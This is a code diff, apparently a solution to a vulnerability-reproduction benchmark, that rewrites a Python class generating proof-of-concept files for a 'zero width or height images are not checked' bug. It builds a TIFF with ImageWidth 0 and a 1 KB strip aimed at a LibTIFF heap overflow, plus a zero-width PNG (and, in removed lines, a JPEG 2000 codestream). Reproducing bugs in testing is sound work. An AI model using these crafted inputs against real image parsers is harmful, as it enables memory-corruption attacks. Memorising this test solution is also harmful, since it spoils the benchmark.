@@ -1,140 +1,121 @@
-import struct
-import tarfile
 import os
+import struct
+import zlib
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
         """
         Generate a PoC that triggers the vulnerability.
         
-        Strategy:
-        The vulnerability is described as "zero width or height images are not checked".
-        This commonly affects image parsing libraries like LibTIFF, OpenJPEG, or LibPNG.
-        The code identifies the target library from the source path and generates
-        a malformed image with 0 width/height.
+        Args:
+            src_path: Path to the vulnerable source code tarball
+            
+        Returns:
+            bytes: The PoC input that should trigger the vulnerability
         """
-        target = "tiff" # Default to TIFF as it's a frequent suspect for this description
+        # Detection logic to determine if the target is LibTIFF or LibPNG
+        # The vulnerability description "zero width or height images are not checked" 
+        # is a classic signature for LibTIFF heap overflows (e.g. in tiffcrop).
+        is_png = False
+        if os.path.exists(src_path):
+            for root, dirs, files in os.walk(src_path):
+                # Check for PNG headers/source to switch mode if necessary
+                if 'png.h' in files or 'libpng' in root.lower():
+                    is_png = True
+                    break
         
-        # Heuristics to identify target
-        try:
-            lower_path = src_path.lower()
-            if "png" in lower_path:
-                target = "png"
-            elif "openjpeg" in lower_path or "jp2" in lower_path:
-                target = "jp2"
-            elif "tiff" in lower_path:
-                target = "tiff"
-            else:
-                # Inspect tarball contents for clues
-                with tarfile.open(src_path, "r:*") as tar:
-                    for name in tar.getnames():
-                        n = name.lower()
-                        if "libtiff" in n:
-                            target = "tiff"
-                            break
-                        if "openjpeg" in n:
-                            target = "jp2"
-                            break
-                        if "png" in n:
-                            target = "png"
-                            break
-        except Exception:
-            pass
-            
-        if target == "png":
-            return self._gen_png()
-        elif target == "jp2":
-            return self._gen_jp2()
+        if is_png:
+            return self._generate_png()
         else:
-            return self._gen_tiff()
+            return self._generate_tiff()
 
-    def _gen_tiff(self) -> bytes:
-        # Generates a TIFF with ImageWidth=0 to trigger Heap Buffer Overflow
-        # Structure: Header + IFD + Payload
+    def _generate_tiff(self) -> bytes:
+        # Construct a Malformed TIFF with ImageWidth = 0.
+        # This typically causes size calculation (Width * Height * BPP) to be 0,
+        # leading to a small allocation. The library then attempts to copy 'StripByteCounts'
+        # amount of data into this buffer, causing a Heap Buffer Overflow.
         
-        # Header: II (little endian), 42, offset 8
-        header = struct.pack('<2sH I', b'II', 42, 8)
+        # 1. TIFF Header: Little Endian ('II'), Version 42, IFD Offset 8
+        header = struct.pack('<2sHI', b'II', 42, 8)
         
-        # Payload: PackBits compressed data (1 literal byte)
-        # PackBits: \x00 (literal count=1) \xFF (data)
-        # This causes the decoder to write 1 byte to the buffer.
-        # If buffer size was calculated as Width(0) * ... = 0, this overflows.
-        payload = b'\x00\xff'
+        # 2. Payload Data
+        # We need sufficient data to overflow the heap buffer (which is likely 0 or very small).
+        # Ground truth length suggests ~2.9KB, we'll use ~1KB which is sufficient for ASAN.
+        payload_size = 1024
+        payload = b'\x41' * payload_size
         
-        # IFD Entries (12 bytes each)
-        # 256 ImageWidth = 0
-        # 257 ImageLength = 1
-        # 258 BitsPerSample = 8
-        # 259 Compression = 32773 (PackBits)
-        # 262 PhotometricInterpretation = 1 (BlackIsZero)
-        # 273 StripOffsets = [calculated]
-        # 277 SamplesPerPixel = 1
-        # 278 RowsPerStrip = 1
-        # 279 StripByteCounts = len(payload)
+        # 3. IFD Entries
+        # Tags must be in ascending order.
+        entries = []
         
-        tags = [
-            (256, 4, 1, 0),
-            (257, 4, 1, 1),
-            (258, 3, 1, 8),
-            (259, 3, 1, 32773),
-            (262, 3, 1, 1),
-            (273, 4, 1, 0), # placeholder
-            (277, 3, 1, 1),
-            (278, 4, 1, 1),
-            (279, 4, 1, len(payload))
-        ]
+        # Tag 256: ImageWidth = 0 (Trigger)
+        entries.append((256, 4, 1, 0))
         
-        # Calculate offsets
-        num_tags = len(tags)
-        ifd_size = 2 + (num_tags * 12) + 4
-        payload_offset = 8 + ifd_size
+        # Tag 257: ImageLength = 10 (Valid height)
+        entries.append((257, 4, 1, 10))
         
-        # Fix StripOffsets
-        final_tags = []
-        for tag, typ, cnt, val in tags:
-            if tag == 273:
-                val = payload_offset
-            final_tags.append((tag, typ, cnt, val))
-            
-        # Serialize IFD
+        # Tag 258: BitsPerSample = 8
+        entries.append((258, 3, 1, 8))
+        
+        # Tag 259: Compression = 1 (No compression)
+        entries.append((259, 3, 1, 1))
+        
+        # Tag 262: PhotometricInterpretation = 1 (BlackIsZero)
+        entries.append((262, 3, 1, 1))
+        
+        # Tag 273: StripOffsets (To be filled)
+        entries.append((273, 4, 1, 0))
+        
+        # Tag 277: SamplesPerPixel = 1
+        entries.append((277, 3, 1, 1))
+        
+        # Tag 278: RowsPerStrip = 10
+        entries.append((278, 4, 1, 10))
+        
+        # Tag 279: StripByteCounts (To be filled)
+        entries.append((279, 4, 1, 0))
+        
+        # 4. Construct IFD
+        num_entries = len(entries)
+        # Size of IFD: 2 (NumEntries) + 12*N (Entries) + 4 (NextOffset)
+        ifd_size = 2 + (num_entries * 12) + 4
+        
+        # Data follows the IFD
+        data_offset = 8 + ifd_size
+        
+        # Update placeholders
+        # StripOffsets (Tag 273) is at index 5
+        entries[5] = (273, 4, 1, data_offset)
+        # StripByteCounts (Tag 279) is at index 8
+        entries[8] = (279, 4, 1, payload_size)
+        
+        # Pack IFD
         ifd = bytearray()
-        ifd.extend(struct.pack('<H', num_tags))
-        for tag in final_tags:
-            ifd.extend(struct.pack('<HHII', *tag))
-        ifd.extend(struct.pack('<I', 0)) # Next IFD offset (0)
+        ifd.extend(struct.pack('<H', num_entries))
+        for tag, typ, count, val in entries:
+            # Entry: Tag(2), Type(2), Count(4), Value/Offset(4)
+            ifd.extend(struct.pack('<HHII', tag, typ, count, val))
+        ifd.extend(struct.pack('<I', 0)) # Next IFD Offset (0 = End)
         
         return header + ifd + payload
 
-    def _gen_png(self) -> bytes:
-        # Generates a PNG with 0 width
+    def _generate_png(self) -> bytes:
+        # Construct a Malformed PNG with Width = 0
+        def chunk(tag, data):
+            crc = zlib.crc32(tag + data) & 0xffffffff
+            return struct.pack('>I', len(data)) + tag + data + struct.pack('>I', crc)
+
         sig = b'\x89PNG\r\n\x1a\n'
         
-        def chunk(name, data):
-            import zlib
-            crc = zlib.crc32(name + data) & 0xffffffff
-            return struct.pack('>I', len(data)) + name + data + struct.pack('>I', crc)
+        # IHDR: Width=0, Height=10, BitDepth=8, ColorType=2 (Truecolor)
+        ihdr_data = struct.pack('>IIBBBBB', 0, 10, 8, 2, 0, 0, 0)
+        ihdr = chunk(b'IHDR', ihdr_data)
         
-        # IHDR: Width=0, Height=1, Depth=8, Color=2, Comp=0, Filter=0, Interlace=0
-        ihdr = chunk(b'IHDR', struct.pack('>IIBBBBB', 0, 1, 8, 2, 0, 0, 0))
+        # IDAT: Some compressed data
+        idat_data = zlib.compress(b'\x00' * 1024)
+        idat = chunk(b'IDAT', idat_data)
+        
+        # IEND
         iend = chunk(b'IEND', b'')
-        return sig + ihdr + iend
-
-    def _gen_jp2(self) -> bytes:
-        # Generates a JPEG 2000 Codestream with 0 width
-        # SOC
-        out = b'\xff\x4f'
-        # SIZ marker (0 width)
-        # Lsiz, Rsiz, Xsiz=0, Ysiz=1, XOsiz=0, YOsiz=0, XTsiz=128, YTsiz=128, XTOsiz=0, YTOsiz=0, Csiz=1
-        params = struct.pack('>HIIIIIIIIH', 
-            0, # Rsiz
-            0, 1, # Xsiz, Ysiz (Width=0)
-            0, 0, # Image offsets
-            128, 128, # Tile size
-            0, 0, # Tile offset
-            1 # Components
-        )
-        params += b'\x07\x01\x01' # 8 bit, 1x1 subsampling
         
-        out += b'\xff\x51' + struct.pack('>H', len(params) + 2) + params
-        out += b'\xff\xd9' # EOC
-        return out
+        return sig + ihdr + idat + iend
